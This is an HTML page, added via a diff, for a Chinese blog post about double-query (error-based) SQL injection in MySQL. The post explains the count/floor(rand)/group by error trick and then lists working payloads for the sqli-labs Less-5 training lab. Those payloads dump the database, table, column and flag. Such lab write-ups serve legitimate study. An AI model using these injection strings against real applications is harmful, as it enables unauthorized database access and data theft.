@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 前言在刷sqli-labs的过程中，刷到less-5的时候我就直接把他当成盲注来处理了，后来发现作者描述的是double injection，于是来补课。双查询注入其实也是报错注入的一种，但是之前确实没接触过。">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入之双查询注入">
+<meta property="og:url" content="https://dopaminer.github.io/2020/02/06/SQL注入之双查询注入/index.html">
+<meta property="og:site_name" content="Dopamine&#39;s Blog">
+<meta property="og:description" content="0x00 前言在刷sqli-labs的过程中，刷到less-5的时候我就直接把他当成盲注来处理了，后来发现作者描述的是double injection，于是来补课。双查询注入其实也是报错注入的一种，但是之前确实没接触过。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205204410.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205222937.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205225045.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205225341.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205225341.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205230400.png">
+<meta property="og:updated_time" content="2020-02-06T02:26:39.889Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入之双查询注入">
+<meta name="twitter:description" content="0x00 前言在刷sqli-labs的过程中，刷到less-5的时候我就直接把他当成盲注来处理了，后来发现作者描述的是double injection，于是来补课。双查询注入其实也是报错注入的一种，但是之前确实没接触过。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205204410.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://dopaminer.github.io/2020/02/06/SQL注入之双查询注入/">
+
+
+
+
+
+  <title>SQL注入之双查询注入 | Dopamine's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Dopamine's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://dopaminer.github.io/2020/02/06/SQL注入之双查询注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D0pamine">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/头像.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dopamine's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入之双查询注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-06T10:05:27+08:00">
+                2020-02-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>在刷sqli-labs的过程中，刷到less-5的时候我就直接把他当成盲注来处理了，后来发现作者描述的是double injection，于是来补课。双查询注入其实也是报错注入的一种，但是之前确实没接触过。</p>
+<a id="more"></a>
+
+<h4 id="0x01-双查询注入"><a href="#0x01-双查询注入" class="headerlink" title="0x01 双查询注入"></a>0x01 双查询注入</h4><h5 id="1-双查询"><a href="#1-双查询" class="headerlink" title="1.双查询"></a>1.双查询</h5><p>SQL中的双查询，其实就是一个select语句里再嵌套一个select语句，里面的叫子查询，执行语句的时候先执行子查询语句，然后从内而外的执行。</p>
+<p>比如：</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205204410.png" alt></p>
+<p>按照执行顺序，先执行<code>select database()</code>，然后再把结果传递给<code>count()</code>，也就是当前数据库的个数，那就是1，再把他显示出来，这个<code>(xxxx)a</code>，其实就是<code>xxxx as a</code> 的简写。</p>
+<h5 id="2-双查询注入原理"><a href="#2-双查询注入原理" class="headerlink" title="2.双查询注入原理"></a>2.双查询注入原理</h5><p>首先来了解几个函数以及group by语法：</p>
+<blockquote>
+<p>count()：返回匹配制定条件的行数</p>
+<p>floor()：向下取整</p>
+<p>rand()：返回0~1间的随机数。</p>
+<p>group by：根据指定列排序，注意和order by的区别就是，group by会删去重复的</p>
+</blockquote>
+<p>而当在一个聚合函数（如count这种对一组值进行计算并返回单一值的函数）的后面使用分组语句（也就是group by这类），就会把查询的一部分以错误的形式显示出来。我们常常利用的就是<code>count(*)</code>，<code>floor(rand(0)*2)</code>和<code>group by</code>连用，使得MYSQL报错，如下图</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205222937.png" alt></p>
+<p>注意from哪个表不重要，只要这个表里有超过三条数据，就可以利用报错信息查询上图第一个框起来的部分。</p>
+<p>至于为什么这几个函数和<code>group by</code>语句连用就可以报错，又为什么表里至少要三条数据，可以看这篇<a href="http://www.2cto.com/article/201604/498394.html" target="_blank" rel="noopener">文章</a>，写的非常详细，膜，我就不班门弄斧了。</p>
+<p>所以双查询注入也是利用报错信息来得到想要的信息的，也是报错注入的一种。唯一一个缺点是，目前我发现双查询注入好像用<code>group_concat()</code>函数的时候就不会报错了？所以得一条一条注，不能直接显示全部，比较麻烦。</p>
+<h4 id="0x02-sqli-labs-LESS-5"><a href="#0x02-sqli-labs-LESS-5" class="headerlink" title="0x02 sqli-labs LESS-5"></a>0x02 sqli-labs LESS-5</h4><p>上面已经解释清楚double injection了，我就不赘述了，直接给出payload，因为用的是buuctf的环境，所以目标是注出flag。</p>
+<p>爆库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205225045.png" alt></p>
+<p>爆表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"ctftraining"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205225341.png" alt></p>
+<p>爆字段名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"flag"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205225341.png" alt></p>
+<p>(表和字段名都是flag)</p>
+<p>爆内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> ctftraining.flag),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200205230400.png" alt></p>
+<p>玄学糊flag.</p>
+<h4 id="0x03-references"><a href="#0x03-references" class="headerlink" title="0x03 references"></a>0x03 references</h4><p>[<a href="https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2]" target="_blank" rel="noopener">https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2]</a>(<a href="https://mochazz.github.io/2017/09/23/Double" target="_blank" rel="noopener">https://mochazz.github.io/2017/09/23/Double</a>_ SQL_Injection/#0x01-双查询)</p>
+<p><a href="https://specters.top/2019/03/05/SQL注入之双查询注入/" target="_blank" rel="noopener">https://specters.top/2019/03/05/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</a></p>
+<p><a href="http://www.2cto.com/article/201604/498394.html" target="_blank" rel="noopener">http://www.2cto.com/article/201604/498394.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/14/Code-breaking write-up（持续更新）/" rel="next" title="Code-breaking write-up(持续更新)">
+                <i class="fa fa-chevron-left"></i> Code-breaking write-up(持续更新)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/头像.jpg" alt="D0pamine">
+            
+              <p class="site-author-name" itemprop="name">D0pamine</p>
+              <p class="site-description motion-element" itemprop="description">Always for you.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-双查询注入"><span class="nav-number">2.</span> <span class="nav-text">0x01 双查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-双查询"><span class="nav-number">2.1.</span> <span class="nav-text">1.双查询</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-双查询注入原理"><span class="nav-number">2.2.</span> <span class="nav-text">2.双查询注入原理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-sqli-labs-LESS-5"><span class="nav-number">3.</span> <span class="nav-text">0x02 sqli-labs LESS-5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-references"><span class="nav-number">4.</span> <span class="nav-text">0x03 references</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D0pamine</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
